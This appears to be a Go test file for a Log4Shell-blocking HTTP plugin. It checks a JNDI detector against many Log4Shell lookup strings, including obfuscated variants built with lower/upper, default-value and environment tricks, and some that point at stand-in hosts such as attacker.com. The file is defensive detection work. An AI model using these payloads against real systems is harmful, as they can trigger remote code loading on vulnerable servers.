package plugin_log4shell

import (
	"context"
	"net/http"
	"net/http/httptest"
	"testing"
)

func Test_containsJNDI(t *testing.T) {
	testCases := []struct {
		desc     string
		value    string
		expected bool
	}{
		{
			desc:     "Simple",
			value:    "${jndi:ldap://127.0.0.1:12/a}",
			expected: true,
		},
		{
			desc:     "Simple uppercase",
			value:    "${JNDI:ldap://127.0.0.1:12/a}",
			expected: true,
		},
		{
			desc:     "With lower",
			value:    "${${lower:j}ndi:ldap://127.0.0.1:12/a}",
			expected: true,
		},
		{
			desc:     "With lower and content",
			value:    "BEFORE ${${lower:j}ndi:ldap://127.0.0.1:12/a} AFTER",
			expected: true,
		},
		{
			value:    "${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://asdasd.asdasd.asdasd/poc}",
			expected: true,
		},
		{
			value:    "${jN${lower:}di:ldap://test}",
			expected: true,
		},
		{
			value:    "${${::-j}ndi:rmi://asdasd.asdasd.asdasd/ass}",
			expected: true,
		},
		{
			value:    "${jndi:rmi://adsasd.asdasd.asdasd}",
			expected: true,
		},
		{
			value:    "${${lower:jndi}:${lower:rmi}://adsasd.asdasd.asdasd/poc}",
			expected: true,
		},
		{
			value:    "${${lower:${lower:jndi}}:${lower:rmi}://adsasd.asdasd.asdasd/poc}",
			expected: true,
		},
		{
			value:    "${${lower:j}${lower:n}${lower:d}i:${lower:rmi}://adsasd.asdasd.asdasd/poc}",
			expected: true,
		},
		{
			value:    "${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://xxxxxxx.xx/poc}",
			expected: true,
		},
		{
			value:    "${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-l}dap${env:BARFOO:-:}//attacker.com/a}",
			expected: true,
		},
		{
			value:    "${${env:BARFOO:-j}di${env:BARFOO:-:}${env:BARFOO:-l}dap${env:BARFOO:-:}//attacker.com/a}",
			expected: false,
		},
	}

	for _, test := range testCases {
		test := test
		t.Run(test.desc, func(t *testing.T) {
			result := containsJNDI(test.value)
			if result != test.expected {
				t.Errorf("got: %v, want: %v", result, test.expected)
			}
		})
	}
}

func TestServeHTTP(t *testing.T) {
	config := CreateConfig()

	next := http.HandlerFunc(func(rw http.ResponseWriter, req *http.Request) {
		rw.WriteHeader(http.StatusTeapot)
	})

	handler, err := New(context.Background(), next, config, "test")
	if err != nil {
		t.Fatal(err)
	}

	req, err := http.NewRequest(http.MethodGet, "http://localhost", http.NoBody)
	if err != nil {
		t.Fatal(err)
	}

	req.Header.Set("User-Agent", "${jN${lower:}di:ldap://test}")

	recorder := httptest.NewRecorder()
	handler.ServeHTTP(recorder, req)

	if recorder.Result().StatusCode != http.StatusOK {
		t.Errorf("got %d, want %d", recorder.Result().StatusCode, http.StatusOK)
	}
}
